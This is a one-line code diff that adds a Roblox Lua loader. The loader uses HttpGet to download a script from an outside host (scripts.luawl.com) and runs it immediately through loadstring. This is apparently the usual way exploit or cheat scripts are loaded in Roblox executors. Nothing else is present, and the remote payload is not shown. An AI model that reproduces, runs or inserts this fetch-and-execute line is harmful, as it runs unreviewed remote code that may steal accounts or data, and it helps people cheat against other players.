@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/1/ICELAND-TIER1.lua'))()
